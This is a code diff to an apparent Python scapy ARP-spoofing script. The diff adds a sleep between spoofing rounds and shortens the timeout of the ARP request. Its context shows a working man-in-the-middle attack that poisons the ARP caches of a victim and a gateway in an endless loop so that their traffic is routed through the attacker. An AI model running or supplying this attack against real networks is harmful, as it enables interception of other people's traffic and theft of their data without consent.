@@ -1,11 +1,11 @@
 from scapy.all import *
 from scapy.layers.l2 import Ether, ARP
-
+import time
 
 def get_mac(victim_ip):
     arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") \
                  / ARP(op=1, pdst=victim_ip)  # ask everyone whi is victim_ip and getting his mac
-    victim_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
+    victim_mac = srp(arp_packet, timeout=1, verbose=False)[0][0][1].hwsrc
     return victim_mac
 
 
@@ -52,6 +52,7 @@ def main():
         while True:  # direct traffic throw us before Control + C
             spoof_arp_cache(victimIP, victimMac, gatewayIP)
             spoof_arp_cache(gatewayIP, gatewayMac, victimIP)
+            time.sleep(2)
     except KeyboardInterrupt as e:
         print("ARP spoofing stopped")
         print(e)
